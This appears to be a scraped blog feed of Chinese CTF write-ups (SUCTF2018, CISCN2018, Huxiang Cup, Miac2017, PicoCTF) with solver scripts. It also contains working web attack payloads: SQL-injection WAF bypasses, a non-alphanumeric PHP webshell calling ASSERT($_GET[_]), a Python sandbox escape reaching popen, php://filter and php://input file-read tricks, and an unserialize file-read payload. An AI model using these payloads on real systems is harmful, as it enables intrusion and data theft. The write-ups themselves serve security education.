ascii(substr(user() from 1 for 1)) &lt; 150 | +------------------------------------------+| 1 | +------------------------------------------+ php中常见的waf及绕过php过滤直接用preg_match(&#39;/(&#39;.waf.&#39;)/i&#39;,$id) 过滤and or123waf = &apos;and|or&apos;过滤代码 1 or 1=1 1 and 1=1绕过方式 1 || 1=1 1 &amp;&amp; 1=1 过滤union123waf = &apos;and|or|union&apos;过滤代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos; 过滤where123waf = &apos;and|or|union|where&apos;过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos;绕过方式 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; 过滤limit123waf = &apos;and|or|union|where|limit&apos;过滤代码 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_id聚合中user_id为1的user为admin 过滤group by123waf = &apos;and|or|union|where|limit|group by&apos;过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1 过滤select123waf = &apos;and|or|union|where|limit|group by|select&apos;过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1绕过方式 1 &amp;&amp; substr(user,1,1) = &apos;a&apos; 过滤’(单引号)123waf = &apos;and|or|union|where|limit|group by|select|\\&apos;&apos;过滤代码 1 &amp;&amp; substr(user,1,1) = &apos;a&apos;绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61) 过滤hex123waf = &apos;and|or|union|where|limit|group by|select|\\&apos;|hex&apos;过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。 过滤substr123waf = &apos;and|or|union|where|limit|group by|select|\\&apos;|hex|substr&apos;过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) 绕过方式 1 &amp;&amp; lpad(user(),1,1) in &apos;r&apos; 参考资料","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"sqli","slug":"sqli","permalink":"http://yoursite.com/tags/sqli/"}]},{"title":"SUCTF2018部分Writeup","date":"2018-05-28T16:00:00.000Z","path":"2018/05/29/SUCTF2018部分Writeup/","text":"MiscSandGame1234567891011import flagflag = flag.flagsands = int(flag[5:-1].encode(\"hex\"), 16)holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373]with open(\"sand.txt\", \"w\") as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+\"\\n\") flag被转化为16进制,并和20个互素的数字取模，符合中国剩余定理的条件。 中国剩余定理 python解题脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# coding: UTF-8import binascii#gcd,求最大公约数函数，递归算法，有了扩展欧几里得算法之后，此函数可以不用 def _g_c_d(a,b): if 0==b: return a return gcd(b,a%b) #扩展欧几里得算法,返回值列表中,x是a的逆元(mod b),q是gcd(a,b),若x是0,则表示没有逆元 #y是计算过程中的迭代的参数,可以不用管 #此算法实质上是广义欧几里得除法的逆运算,用递归可以体现出这个逆运算的过程 def Ex_Euclid(a,b): if 0==b: x=1;y=0;q=a return x,y,q xyq=Ex_Euclid(b,a%b) x=xyq[0];y=xyq[1];q=xyq[2] temp=x;x=y;y=temp-a//b*y return x,y,q #获取a的逆元(mod b)的函数，目的是为了封装获取逆元的功能 def Get_Inverse(a,b): return Ex_Euclid(a,b)[0] #获取a和b的最大公约数函数，目的是为了封装获取最大公约数的功能 def gcd(a,b): return Ex_Euclid(a,b)[2] #判断所有的mi是否两两互质 def Is_Coprime(m_list): for i in range(len(m_list)): for j in range(i+1,len(m_list)): if 1!=gcd(m_list[i],m_list[j]): return 0 #返回0表示不是两两互质的 return 1 #返回1表示是两两互质的 #获取所有的Mi def Get_Mi(m_list,M): Mi_list=[] for mi in m_list: Mi_list.append(M//mi) return Mi_list #获取所有的Mi的逆元 def Get_Mi_inverse(Mi_list,m_list): Mi_inverse=[] for i in range(len(Mi_list)): Mi_inverse.append(Get_Inverse(Mi_list[i],m_list[i])) return Mi_inverse #中国剩余定理,返回值为最终的x def C_R_T(): while True: #两个列表，分别用来保存mi和bi m_list=[257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] b_list=[222, 203, 33, 135, 203, 62, 227, 82, 239, 82, 11, 220, 74, 92, 8, 308, 195, 165, 87, 4] M=1 #M是所有mi的乘积 for mi in m_list: M*=mi Mi_list=Get_Mi(m_list,M) Mi_inverse=Get_Mi_inverse(Mi_list,m_list) x=0 for i in range(len(b_list)): #开始计算x x+=Mi_list[i]*Mi_inverse[i]*b_list[i] x%=M return x if __name__=='__main__': solve = C_R_T() print(solve) 输出16进制的flag，转化为ascii字符串。 flag{This_is_the_CRT_xwg)} Game一道博弈论题目，开头sha256爆破，之后是三种经典博弈巴什博奕，威佐夫博弈，尼姆博弈 脚本写的很丑。。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169from pwn import *import hashlibimport itertools as itsimport reimport mathdef check(strr,hash1): s=r'1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm' r=its.product(s,repeat=4) for i in r: st = \"\".join(i) s = strr+st mst=hashlib.sha256(s).hexdigest() if(mst==hash1): return stdef bashgame(): global rec n= int(re.findall(\"are (.*?) stones\",rec)[0]) k= int(re.findall(\"pick 1 - (.*?) once\",rec)[0]) r = n%(1+k) if r==0: sh.sendline('GG') rec = sh.recvuntil('Your turn: \\n') print rec return print r #print sh.recv(1024) sh.sendline(str(r)) #print sh.recv() while 1: rec = sh.recvuntil('Your turn: \\n') print rec if \"You win!\" in rec: break x = re.findall(\"I pick (.*?)!\",rec)[0] sss= 1+k-int(x) print sss sh.sendline(str(sss))def wythoffgame(): global rec while(1): flag=False a = int(re.findall(\"Piles: (.*?) (.*?)\\n\",rec)[0][0]) b = int(re.findall(\"Piles: (.*?) (.*?)\\n\",rec)[0][1]) if(a==0): sh.sendline(str(b)+' 1') print(\"a==0\") return if(b==0): sh.sendline(str(a)+' 0') print(\"b==0\") return if(a==b): sh.sendline(str(a)+' 2') print(\"a==b\") return if(a&gt;b): a,b=b,a flag=True k = int(2*a/((1+math.sqrt(5.0)))+1) ak = int(k*(1+math.sqrt(5))/2) if(ak!=a): k = int(2*b/((3+math.sqrt(5.0)))+1) ak = int(k*(1+math.sqrt(5))/2) bk = ak+k print a,b,k,ak,bk if(abs(a-b)==k and a==ak): sh.sendline('GG') print(\"GG\") return if(a==ak and b&gt;bk): if flag: print b-bk sh.sendline(str(b-bk)+' 0') else: print b-bk sh.sendline(str(b-bk)+' 1') elif(a&gt;ak and b==bk): if flag: print a-ak sh.sendline(str(a-ak)+' 1') else: print a-ak sh.sendline(str(a-ak)+' 0') elif(a==ak and b&lt;bk): tmp=a-int((b-a)*(1+math.sqrt(5))/2) print tmp sh.sendline(str(tmp)+' 2') else: while(k): k-=1 aj=int((k)*(1+math.sqrt(5))/2) bj=int((k)*(3+math.sqrt(5))/2) if(a==bj): tmp=b-aj if(flag): sh.sendline(str(tmp)+' 0') print tmp else: sh.sendline(str(tmp)+' 1') print tmp rec = sh.recvuntil('Your turn: \\n')def nimmgame(): while(1): rec=sh.recvline() print rec num = re.findall(\"Piles: (.*?) (.*?) (.*?) (.*?) (.*?)\\n\",rec)[0] a=[] ans=0 flag=False for i in range(len(num)): a.append(int(num[i])) for i in range(len(a)): ans=ans^a[i] if(ans==0): sh.sendline('GG') print 'GG' return for i in range(len(a)): for j in range(0,a[i]+1): ans=j for k in range(len(a)): if(k==i): continue else: ans=ans^a[k] if(ans==0): print a[i]-j,i sh.sendline(str(a[i]-j)+' '+str(i)) flag=True if(flag): break if(flag): break rec=sh.recvline() if('You win!' in rec): return if __name__ == '__main__': sh =remote('game.suctf.asuri.org',10000) sh.recvuntil('Prove your heart!') ch = sh.recv(1024) strr = ch[8:20] hash1=ch[32:-1] che=check(strr,hash1) sh.sendline(che) sh.recvuntil('skip') rec = sh.recvuntil('Your turn: \\n') for i in range(0,20): bashgame() for i in range(0,20): wythoffgame() if(i==19): rec = sh.recvuntil('Round 1\\n') else: rec = sh.recvuntil('Your turn: \\n') print rec for i in range(0,20): nimmgame() if(i==19): print sh.recvall() else: print sh.recvuntil(\"Round %s\\n\"%str(i+2)) SUCTF{gGGGGggGgGggGGggGGGggGgGgggGGGGGggggggGgGggggGg} WebAnonymousphp代码：12345678910111213&lt;?php$MY = create_function(\"\",\"die(`cat flag.php`);\");$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(\"function SUCTF_$hash()&#123;\" .\"global \\$MY;\" .\"\\$MY();\" .\"&#125;\");if(isset($_GET['func_name']))&#123; $_GET[\"func_name\"](); die();&#125;show_source(__FILE__); create_function()函数可以创建一个匿名函数，但当匿名函数创建之后，他自己也有对应的名称。 \\x00lambda_%d,%d代表他是当前进程中的第几个匿名函数，但是他是无法预测的，我们不知道当前进程中还有多少匿名函数。 func_name=phpinfo，查看phpinfo，apache使用了prefork的mod，在这个模式下，apache会重开进程来处理大量的请求，这样就可以预测%d了。 orange师傅的fork脚本1234567891011121314151617181920212223242526# coding: UTF-8# Author: orange@chroot.orgimport requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = 'web.suctf.asuri.org' PORT = 81 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall('GET / HTTP/1.1\\nHost: 127.0.0.1\\nConnection: Keep-Alive\\n\\n') # s.close() print 'ok' time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) getflag：1234567import requestswhile 1: r=requests.get(\"http://web.suctf.asuri.org:81/?func_name=\\x00lambda_1\").content if '&#123;' in r: print r break SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK} Getshell绕过黑名单的题目，测试可用字符有~[]()=_;.，用这些组成一个shell。 摘自findneo师傅的blog1&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]); 分析12345678910111213141516&lt;?= $_=_==_;//1$__=~一[$_];//G$___=~了[$_];//E$____=~端[$_];//T$_____=~得[$_];//A$______=~第[$_];//S$_______=~学[$_];//R$_=_.$__.$___.$____;//_GET$_=$$_;//$_GET$__=$_____.$______.$______.$___.$_______.$____;//ASSERT$__($_[_]);//ASSERT($_GET[_]);------------------------------------------------------http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=phpinfo(); SUCTF{KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o}","tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"},{"name":"Writeup","slug":"Writeup","permalink":"http://yoursite.com/tags/Writeup/"}]},{"title":"2018CISCN初赛Writeup","date":"2018-05-06T16:00:00.000Z","path":"2018/05/07/2018国赛writeup/","text":"这次国赛作为一个Web选手倍受打击，web需要pwn师傅，crypto需要反编译，misc需要内核分析，mong男落泪，以后要学习一下二进制知识了。写了几个自己做出来的题的writeup。 Misc验证码[签到版]开赛的时候以为是机器学习，尝试着随便点了点时间到了就拿到了flag，估计是出了非预期解。 picture图片放入binwalk 提取出了97E4文件,文件内容是base64，解密。 开头是KP，后面有PK文件，是一个zip压缩包，用python提取。 1234567import base64input=open('97E4','r')output=open('key.zip','wb')key=input.read()output.write(base64.b64decode(key))input.close()output.close() 将开头的KP修改为PK，打开压缩包，code文件有加密，注释里有提示。 网上找对应的报错信息，得到解压密码是integer division or modulo by zero 得到code，采用了uuencode，用linux解密得到flag。 run这题是一个python的沙盒逃逸，题目要求getshell。 用类继承和全局变量方法可以直接读取文件。⁬print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/passwd&quot;).read() 这里碰巧读到了题目的源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-09 23:30:58# @Author : Xu (you@example.org)# @Link : https://xuccc.github.io/# @Version : $Id$from sys import modulesfrom cpython import get_dictfrom types import FunctionTypemain = modules['__main__'].__dict__origin_builtins = main['__builtins__'].__dict__def delete_type(): type_dict = get_dict(type) del type_dict['__bases__'] del type_dict['__subclasses__']def delete_func_code(): func_dict = get_dict(FunctionType) del func_dict['func_code']def safe_import(__import__,whiteList): def importer(name,globals=&#123;&#125;,locals=&#123;&#125;,fromlist=[],level=-1): if name in whiteList: return __import__(name,globals,locals,fromlist,level) else: print \"HAHA,[%s] has been banned~\" % name return importerclass ReadOnly(dict): \"\"\"docstring for ReadOnlu\"\"\" def __delitem__(self,keys): raise ValueError(\":(\") def pop(self,key,default=None): raise ValueError(\":(\") def popitem(self): raise ValueError(\":(\") def setdefault(self,key,value): raise ValueError(\":(\") def __setitem__(self,key,value): raise ValueError(\":(\") def __setattr__(self, name, value): raise ValueError(\":(\") def update(self,dict,**kwargs): raise ValueError(\":(\")def builtins_clear(): whiteList = \"raw_input SyntaxError ValueError NameError Exception __import__\".split(\" \") for mod in __builtins__.__dict__.keys(): if mod not in whiteList: del __builtins__.__dict__[mod]def input_filter(string): ban = \"exec eval pickle os subprocess input sys ls cat\".split(\" \") for i in ban: if i in string.lower(): print \"&#123;&#125; has been banned!\".format(i) return \"\" return string# delete_type();del delete_typedelete_func_code();del delete_func_codebuiltins_clear();del builtins_clearwhiteMod = []origin_builtins['__import__'] = safe_import(__import__,whiteMod)safe_builtins = ReadOnly(origin_builtins);del ReadOnlymain['__builtins__'] = safe_builtins;del safe_builtinsdel get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionTypedel __builtins__, __doc__, __file__, __name__, __package__print \"\"\" ____ | _ \\ _ _ _ __ | |_) | | | | '_ \\ | _ &lt;| |_| | | | | |_| \\_\\\\__,_|_| |_|Escape from the dark house built with python :)Try to getshell then find the flag!\"\"\"while 1: inp = raw_input('&gt;&gt;&gt;') cmd = input_filter(inp) try: exec cmd except NameError, e: print \"wow something lose!We can\\'t find it ! D:\" except SyntaxError,e: print \"Noob! Synax Wrong! :(\" except Exception,e: print \"unknow error,try again :&gt;\" 这里过滤了ls，没法用func_globals，但是可以用__getattribute__(&#39;func_global&#39; + &#39;s&#39;)替代。在用popen函数getshell。 payload：print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;+&#39;s /home/&#39;).read() Cryptooldstreamgame类似于强网杯流密码的题目，明文在2^31~2^32之间，尝试用爆破的方式。 12345678910111213141516171819202122232425262728293031import base64def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffffff i=(R&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)mask = 0b10100100000010000000100010010100key=[]f=open('./key','rb+')for i in f.read(): key.append(ord(i))for R in range(pow(2,31),pow(2,32)):#2147483648~4294967296 flag = True r = R print(R) for i in range(100): tmp = 0 for j in range(8): (R, out) = lfsr(R, mask) tmp = (tmp &lt;&lt; 1) ^ out if tmp != key[i]: flag = False break if flag: print(hex(r)[:]) break 由于内存太小，分组进行爆破，跑了很久才得到flag。 flag_in_your_hand查看js，找到关键代码。 12345678910111213141516function ck(s) &#123; try &#123; ic &#125; catch (e) &#123; return; &#125; var a = [118, 104, 102, 120, 117, 108, 119, 124, 48, 123, 124, 105]; if (s.length == a.length) &#123; for (i = 0; i &lt; s.length; i++) &#123; if (a[i] - s.charCodeAt(i) != 3) return ic = false; &#125; return ic = true; &#125; return ic = false;&#125; 用脚本跑出s。12345a = [118, 104, 102, 120, 117, 108, 119, 124, 48, 123, 124, 105]s = \"\"for i in a: s+=chr(i-3)print s 提交到html得到flag Webeasywebusername为admin，密码置空即可登陆得到flag。","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"2017湖湘杯Writeup","date":"2017-11-26T16:00:00.000Z","path":"2017/11/27/2017湖湘杯writeup/","text":"WebWeb200op参数能读取执行功能的php，尝试用位协议读取源码。 php://filter/read=convert.base64-encode/resource=xxx 得到源码 home.php123456789101112131415&lt;?phpinclude 'common.php';?&gt;&lt;center&gt;&lt;div class=\"article\"&gt; &lt;h2&gt;Welcome!!&lt;/h2&gt; &lt;p&gt; We let you upload PNG image files and store it!&lt;br/&gt; &lt;/p&gt; &lt;p&gt; Get started by &lt;a href=\"?op=upload\"&gt;uploading a picture&lt;/a&gt; &lt;/p&gt; &lt;/div&gt;&lt;/center&gt; 指向common.phpcommon.php123456789101112131415161718192021&lt;?phpif(!defined('FROM_INDEX')) die();define('MAX_IM_SIZE', 100);function create_image_key() &#123; return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());&#125;function load_image($imagekey) &#123; if(1 !== preg_match('/[0-9a-f]&#123;40&#125;/', $imagekey)) &#123; fatal('Invalid image key.'); &#125; $im = imagecreatefrompng(\"uploads/&#123;$imagekey&#125;.png\"); if(!$im) &#123; fatal('Failed to load image.'); &#125; return $im;&#125;stream_wrapper_unregister (\"zip\"); 发现stream_wrapper_unregister (&quot;zip&quot;);，可以通过上传zip，然后通过伪协议来getshell。 Web150开始swp没有办法得到源码。。很头痛 题目更新，通过.index.php.swp得到源码 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = \"*********************\";echo \"please input a rand_num !\";function create_password($pw_length = 10)&#123; $randpwd = \"\"; for ($i = 0; $i &lt; $pw_length; $i++)&#123; $randpwd .= chr(mt_rand(100, 200)); &#125; return $randpwd;&#125;session_start();mt_srand(time());$pwd=create_password();echo $pwd.'||'; if($pwd == $_GET['pwd'])&#123; echo \"first\"; if($_SESSION['userLogin']==$_GET['login']) echo \"Nice , you get the flag it is \".$flag ;&#125;else&#123; echo \"Wrong!\";&#125;$_SESSION['userLogin']=create_password(32).rand();?&gt; 根据时间戳生成随机数然后与pwd参数对比，可以用python脚本来getflag。 1234567891011import requestsurl='http://114.215.138.89:10080/'data=requests.get(url).contentdata=data.split(b'||')[0].split(b'&lt;br&gt;')[1]get=&#123;'pwd':data&#125;data=requests.get(url,get).contentprint data Web300题目提示getshell，并过滤了数字字母和一些特殊字符。 要用仅剩的特殊字符构造成webshell。 1$_=[].'';$_=$_['('==')'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); payload：http://114.215.71.135:10080/?content=%24_%3D%5B%5D.%27%27%3B%24_%3D%24_%5B%27%7B%27%3D%3D%27%7D%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B 跳转到shell页面通过命令getflag RE简单的安卓逆向下载apk，反编译。查看Mainactivity得到flag。","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"Miac2017第二轮Writeup","date":"2017-11-26T16:00:00.000Z","path":"2017/11/27/miac第二轮/","text":"WEB签到题查看源代码&lt;input type=&quot;text&quot; maxlength=&quot;3&quot; name=&quot;pass&quot;/&gt;提示输入更大的数，并限制了text的maxlength，F12修改html，删除maxlength部分. 简单的题查看源代码，给出了部分php，审计。12345if(isset($_POST['password'])) &#123; if (strcmp($_POST['password'], $flag) == 0) die($flag); else echo \"密码不正确！\"; strcmp可以直接用数组绕过，将password改为数组即可。 WEB100-2提示?hint，随便尝试一下，?hint=1，显示了源码。 核心部分。123456789101112$KEY='BDCTF:www.bluedon.com'; include_once(\"flag.php\"); $cookie = $_COOKIE['BDCTF']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === \"$KEY\") &#123; echo \"$flag\"; &#125; 将key的值序列化放在cookie的BDCTF变量中即可。 送大礼访问flag.txt，解jsfuck得到1234567891011121314extract($_GET); if(isset($bdctf)) &#123; $content=trim(file_get_contents($flag)); if($bdctf==$content) &#123; echo'bdctf&#123;**********&#125;'; &#125; else &#123; echo'这不是蓝盾的密码啊'; &#125; &#125;&#125; 变量覆盖漏洞。 蓝盾管理员部分php源码123456789@$user = $_GET[\"user\"]; @$file = $_GET[\"file\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is bdadmin\"))&#123; echo \"hello bd-admin!&lt;br&gt;\"; include($file); //flag.php &#125;else&#123; echo \"you are not bd-admin ! \"; &#125; 用php伪协议php://input绕过file_get_contents($user,&#39;r&#39;)===&quot;the user is bdadmin&quot;。 然后可以直接用file变量的伪协议读取file.php bluedon用户与蓝盾管理员类似，不过读取的是class.php1234567891011&lt;?phpclass Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return \"æ­åget flag\"; &#125;&#125;?&gt; index.php1234567891011121314151617181920212223242526272829303132&lt;?php@$user = $_GET[\"user\"];@$file = $_GET[\"file\"];@$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is bluedon\"))&#123; echo \"hello bluedon!&lt;br&gt;\"; if(preg_match(\"/f1a9/\",$file))&#123; exit(); &#125;else&#123; @include($file); //class.php $pass = unserialize($pass); echo $pass; &#125;&#125;else&#123; echo \"you are not bluedon ! \";&#125;?&gt;&lt;!--$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is bluedon\"))&#123; echo \"hello bluedon!&lt;br&gt;\"; include($file); //class.php&#125;else&#123; echo \"you are not bluedon ! \";&#125; --&gt; 不能直接读取f1a9，但是可以用反序列化读取。 O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;} MISC杂项全家桶解压出一张损坏的png图片，16进制打开发现没有文件头，将文件头补全89 50 4E 47 0D 0A 1A 0A，得到一张二维码，扫描二维码，得到工井大人夫王。 当铺密码，解密得485376 对png图片分析，发现png图片还有一个rar的压缩包，里面是一个MP3，猜测是MP3Stego隐写，密码就是解出的数字。 decode.exe -X music.mp3 -P 485376得到fx4qx0hj_4_cg{Wvf} 应该是栅栏和凯撒密码的结合，解栅栏密码fhgxj{4_Wq4vx_f0c}，猜测前面是bdctf，用凯撒解密得到flag。 bdctf{4_Sm4rt_b0y} Stega像素隐藏zip压缩包为伪加密，直接修改0400后面的为0000即可解压出图片。 图片没有隐藏内容，发现有透明框，修改图片的高度得到flag。","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"PicoCTF Level2 WriteUp","date":"2017-09-17T16:00:00.000Z","path":"2017/09/18/PicoCTF-level2-WriteUp/","text":"WebMy First SQL网页是一个登录界面，尝试万能密码。12admin&apos;or&apos;1&apos;=&apos;1 成功登陆。 分析sql查询语句如下select * from users where user = &#39;admin&#39; and pass = &#39;&#39;or&#39;1&#39;=&#39;1&#39;;flag:be_careful_what_you_let_people_ask_1b3db77df6b116a38db8ceb7c81cb14c TW_GR_E1_ART12345TW_GR_E1_ARTOh, sweet, they made a spinoff game to Toaster Wars! That last room has a lot of flags in it though. I wonder which is the right one...? Check it out here. HINTS I think this game is running on a Node.js server. If it&apos;s configured poorly, you may be able to access the server&apos;s source. If my memory serves me correctly, Node servers have a special file that lists dependencies and a start command; maybe you can use that file to figure out where the other files are? 题目是一个运行在node.js的js游戏，玩了一会，在第4层发现了好多flag，随便挑一个使用，发现所有的道具都被销毁了，可能这是一个假的flag。。。 看了一下writeup，所有node.js server都会有一个package.json储存配置信息，先访问看看。123456789101112131415161718192021222324252627&#123; &quot;name&quot;: &quot;rogue-1&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;main&quot;: &quot;server/serv.js&quot;, &quot;dependencies&quot;: &#123; &quot;beautiful-log&quot;: &quot;^1.3.0&quot;, 